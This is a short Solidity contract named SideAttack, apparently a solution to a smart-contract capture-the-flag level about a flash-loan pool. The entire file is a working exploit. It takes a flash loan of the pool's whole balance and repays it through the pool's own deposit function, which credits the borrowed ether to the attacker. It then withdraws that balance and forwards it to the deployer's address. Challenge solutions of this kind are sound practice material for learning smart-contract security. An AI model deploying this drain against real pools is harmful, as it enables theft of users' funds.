// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
    
}

contract SideAttack  {
    IPool immutable pool;
    address private attacker;

    constructor(address _poolAddress){
        pool = IPool(_poolAddress);
        attacker = msg.sender;
    }
   function Attack () external  {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
   }
   function execute() external payable {
        pool.deposit{value: msg.value}();
   }
   receive() external payable {
        payable(attacker).transfer(address(this).balance);
   }
}